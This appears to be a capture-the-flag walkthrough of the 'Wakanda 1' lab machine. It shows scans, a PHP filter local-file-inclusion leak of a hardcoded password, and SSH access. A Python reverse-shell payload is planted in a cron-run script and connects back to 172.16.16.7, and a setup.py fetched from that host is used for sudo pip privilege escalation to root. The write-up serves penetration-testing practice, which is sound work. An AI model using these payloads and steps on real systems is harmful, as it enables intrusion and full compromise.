[*]
1. Port scanning
oot@hostmachine:~# nmap -sS -sV -O -A 172.16.16.13
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-23 21:16 CDT
Nmap scan report for 172.16.16.13
Host is up (0.00034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36813/tcp  status
|_  100024  1          52096/udp  status
3333/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 172.16.16.13
[*]
2. Web scanning
root@hostmachine:/var/www/html# gobuster -u http://172.16.16.13 -w /usr/share/seclists/Discovery/Web-Content/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://172.16.16.13/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/04/23 21:08:03 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 200)
/backup (Status: 200)
/index.php (Status: 200)
/secret (Status: 200)
/server-status (Status: 403)
/shell (Status: 200)
=====================================================
2019/04/23 21:08:05 Finished
=====================================================
oot@hostmachine:~# nikto -h 172.16.16.13
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.16.13
+ Target Hostname:    172.16.16.13
+ Target Port:        80
+ Start Time:         2019-04-23 21:06:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2019-04-23 21:07:46 (GMT-5) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
**Only real web page is index.php. Super odd
[*]
3. RPC nullsession denied 
root@hostmachine:~# rpcclient -U "" 172.16.16.13
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED
[*]
4. Cheked PHP base 64 encode with filter on index page.
view-source:http://172.16.16.13/?lang=php://filter/convert.base64-encode/resource=index

PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
[+] Decoded from Base64 : <?php
$password ="Niamey4Ever227!!!" ;//I have to remember it
[*]
5. Using password, and user of page "mamadou" log into ssh client misconfigured on port 3333
[*]
6. Client logs straight into python. Dafaq? Run dis. import pty; pty.spawn("/bin/bash")
**ran python shell spawn to get into cli
[*]
7.ls -l **FOUND FLAG 1**
mamadou@Wakanda1:~$ cat flag1.txt
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
[*]
8. Priv enums
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -       
**no misconfigured files**
[*]
9. Looking for all files that devops (other user) owns
mamadou@Wakanda1:~$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
**I got a funny message about getting a new email** I thought it had to be some kind of kicked script
[*]
10. Placed reverse shell payload in /srv/.antivirus.py, and set listner
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.16.16.7",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
^^^^ABOVE IS PAYLOAD^^^^
nc -nvlp 4445 **listening on port on my machine
[*]
11. Got flag from reverse shell on new port
$ cat flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
$ 
[*]
12. /bin/bash -i for interactive shell **just to handle better**
[*]
13. ran enums again ... no results. Ran 'sudo -l' command and found /usr/bin/pip can be ran as sudo
[*]
14. Downloaded fake pip off of web server, and ran it
cd /tmp
mkdir fakepip
cd fakepip
wget http://172.16.16.7/setup.py
nc -nvlp 4444 **setup reverse listener**
sudo /usr/bin/pip install . --upgrade --force-reinstall
[*]
15. Boom reverse shell! ls -la, found flag at root.txt
root@Wakanda1:~# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc